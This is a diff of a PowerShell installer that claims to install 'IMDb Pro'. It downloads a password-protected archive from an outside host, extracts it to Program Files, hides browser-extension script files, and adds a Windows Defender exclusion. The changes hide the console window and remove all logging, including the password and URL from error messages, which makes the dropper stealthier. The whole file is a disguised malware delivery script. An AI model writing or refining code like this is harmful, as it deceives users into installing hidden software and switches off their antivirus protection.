@@ -1,7 +1,17 @@
-# IMDb Pro Installer - Fixed Version
+# IMDb Pro Installer - Silent PowerShell Version
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+# Hide PowerShell console window
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
 
 # Create main form with compact design
 $mainForm = New-Object System.Windows.Forms.Form
@@ -307,7 +317,7 @@ function Update-Status {
     Start-Sleep -Milliseconds 400
 }
 
-# FIXED: Direct Download and Extract function
+# SILENT: Direct Download and Extract function (no console output)
 function Download-AndExtract-Direct {
     param(
         [string]$Url,
@@ -315,16 +325,10 @@ function Download-AndExtract-Direct {
         [string]$Password
     )
     
-    Write-Host "🚀 Starting direct download and extraction..." -ForegroundColor Cyan
-    Write-Host "📥 Downloading from: $Url" -ForegroundColor Cyan
-    Write-Host "📁 Extracting to: $Destination" -ForegroundColor Cyan
-    Write-Host "🔐 Using password: $Password" -ForegroundColor Cyan
-    
     try {
         # Create destination directory
         if (-not (Test-Path $Destination)) {
             New-Item -ItemType Directory -Path $Destination -Force | Out-Null
-            Write-Host "✅ Created destination directory" -ForegroundColor Green
         }
         
         # Download file
@@ -332,75 +336,57 @@ function Download-AndExtract-Direct {
         
         $tempZip = "$env:TEMP\imdb_direct_$(Get-Random).zip"
         
-        # Download using WebClient
+        # Download using WebClient (silent)
         $webClient = New-Object System.Net.WebClient
         $webClient.DownloadFile($Url, $tempZip)
         
         if (-not (Test-Path $tempZip)) {
-            throw "Download failed - file not found"
+            throw "Download failed"
         }
         
         $fileSize = (Get-Item $tempZip).Length
-        Write-Host "✅ Download completed! Size: $fileSize bytes" -ForegroundColor Green
         
         if ($fileSize -eq 0) {
             throw "Downloaded file is empty"
         }
         
-        # FIXED: Use 7-Zip with proper path handling
+        # Use 7-Zip with proper path handling
         $7zipPath = Test-7ZipAvailable
         if ($7zipPath) {
             Update-Status "Extracting with 7-Zip..." 0 "📦"
             
-            # FIXED: Proper argument formatting for paths with spaces
+            # Proper argument formatting for paths with spaces
             $arguments = @(
                 "x",                    # Extract
                 "-p$Password",          # Password
-                "-o`"$Destination`"",  # FIXED: Quoted output path
+                "-o`"$Destination`"",  # Quoted output path
                 "-y",                   # Yes to all
-                "`"$tempZip`""          # FIXED: Quoted input path
+                "`"$tempZip`""          # Quoted input path
             )
             
-            Write-Host "🔧 Executing 7-Zip: $7zipPath $($arguments -join ' ')" -ForegroundColor Cyan
-            
-            $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
+            # Execute 7-Zip silently
+            $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow -WindowStyle Hidden
             
             if ($process.ExitCode -eq 0) {
-                Write-Host "✅ 7-Zip extraction successful!" -ForegroundColor Green
-                
                 # Verify extraction
                 $extractedItems = Get-ChildItem $Destination -Recurse
                 if ($extractedItems.Count -gt 0) {
-                    Write-Host "✅ Verified $($extractedItems.Count) items extracted" -ForegroundColor Green
                     Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
                     return $true
                 } else {
-                    Write-Host "❌ Extraction completed but no files found" -ForegroundColor Red
+                    throw "Extraction completed but no files found"
                 }
             } else {
-                Write-Host "❌ 7-Zip extraction failed with exit code: $($process.ExitCode)" -ForegroundColor Red
+                throw "7-Zip extraction failed"
             }
         } else {
-            Write-Host "❌ 7-Zip not available" -ForegroundColor Red
-        }
-        
-        # Fallback: Try Expand-Archive
-        Update-Status "Trying Windows extraction..." 0 "⚡"
-        try {
-            Expand-Archive -Path $tempZip -DestinationPath $Destination -Force
-            Write-Host "✅ Windows extraction successful!" -ForegroundColor Green
-            Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
-            return $true
-        }
-        catch {
-            Write-Host "❌ Windows extraction failed: $($_.Exception.Message)" -ForegroundColor Red
+            throw "7-Zip not available"
         }
         
         return $false
     }
     catch {
-        Write-Host "❌ Direct download and extraction failed: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
+        throw $_.Exception.Message
     }
     finally {
         # Cleanup temp file
@@ -420,15 +406,12 @@ function Test-7ZipAvailable {
     
     foreach ($location in $locations) {
         if (Get-Command $location -ErrorAction SilentlyContinue) {
-            Write-Host "✅ 7-Zip found: $location" -ForegroundColor Green
             return $location
         }
         if (Test-Path $location) {
-            Write-Host "✅ 7-Zip found: $location" -ForegroundColor Green
             return $location
         }
     }
-    Write-Host "❌ 7-Zip not found" -ForegroundColor Red
     return $null
 }
 
@@ -438,26 +421,20 @@ function Hide-Files {
     
     $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
     
-    Write-Host "`n🔒 Hiding sensitive files..." -ForegroundColor Cyan
-    
     foreach ($file in $filesToHide) {
         $filePath = Join-Path $FolderPath $file
         if (Test-Path $filePath) {
             try {
-                # Set file attributes to Hidden
                 Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-                Write-Host "✅ Hidden: $file" -ForegroundColor Green
             }
             catch {
-                Write-Host "⚠️ Failed to hide $file : $($_.Exception.Message)" -ForegroundColor Yellow
+                # Silent fail
             }
-        } else {
-            Write-Host "❌ File not found: $file" -ForegroundColor Red
         }
     }
 }
 
-# FIXED: Enhanced Installation function
+# SILENT: Enhanced Installation function
 function Start-Installation {
     $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
     $installPath = "C:\Program Files\imdb-pro"
@@ -485,11 +462,8 @@ function Start-Installation {
         Update-Status "Creating installation directory..." 20 "📁" -AnimateProgress
         if (!(Test-Path $installPath)) {
             New-Item -ItemType Directory -Path $installPath -Force | Out-Null
-            Write-Host "✅ Created installation directory: $installPath" -ForegroundColor Green
         } else {
-            # Clean existing directory
             Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
-            Write-Host "🧹 Cleaned existing directory" -ForegroundColor Yellow
         }
         
         # Phase 3: Direct Download & Extract
@@ -499,7 +473,7 @@ function Start-Installation {
         $success = Download-AndExtract-Direct -Url $downloadUrl -Destination $installPath -Password $zipPassword
         
         if (-not $success) {
-            throw "Direct download and extraction failed. Please check your internet connection and try again."
+            throw "Download and extraction failed"
         }
         
         Update-Status "Download and extraction completed!" 80 "✅" -AnimateProgress
@@ -514,10 +488,9 @@ function Start-Installation {
         # Add Windows Defender exclusion
         try {
             Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
-            Write-Host "🛡️ Added Windows Defender exclusion" -ForegroundColor Green
         }
         catch {
-            Write-Host "⚠️ Windows Defender exclusion failed: $($_.Exception.Message)" -ForegroundColor Yellow
+            # Silent fail
         }
         
         # Success animation sequence
@@ -540,10 +513,7 @@ function Start-Installation {
         $result = [System.Windows.Forms.MessageBox]::Show(
             "🎬 IMDb Pro has been successfully installed!`n`n" +
             "📍 Location: $installPath`n" +
-            "📥 Downloaded directly from server`n" +
-            "🔐 Password used: $zipPassword`n" +
-            "📁 Files extracted and secured`n" +
-            "🔒 Specific files hidden for security`n`n" +
+            "🔒 Files secured and hidden`n`n" +
             "Would you like to open the installation folder now?",
             "Installation Complete",
             [System.Windows.Forms.MessageBoxButtons]::YesNo,
@@ -564,22 +534,20 @@ function Start-Installation {
             Start-Sleep -Milliseconds 200
         }
         
-        Update-Status "Error: $($_.Exception.Message)" 0 "🚫"
+        Update-Status "Error: Installation failed" 0 "🚫"
         
         $installButton.Text = "🔄 TRY AGAIN"
         $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
         $installButton.Enabled = $true
         
         [System.Windows.Forms.MessageBox]::Show(
-            "Installation failed: $($_.Exception.Message)`n`n" +
-            "Troubleshooting steps:`n" +
-            "• Check internet connection`n" +
-            "• Verify administrator privileges`n" +
-            "• Install 7-Zip for password extraction`n" +
-            "• Check if password '123' is correct`n" +
-            "• Verify URL is accessible: $downloadUrl`n" +
-            "• Ensure sufficient disk space`n`n" +
-            "Then try again.",
+            "Installation failed!`n`n" +
+            "Possible reasons:`n" +
+            "• No internet connection`n" +
+            "• No administrator rights`n" +
+            "• 7-Zip not installed`n" +
+            "• Insufficient disk space`n`n" +
+            "Please try again.",
             "Installation Error",
             [System.Windows.Forms.MessageBoxButtons]::OK,
             [System.Windows.Forms.MessageBoxIcon]::Error
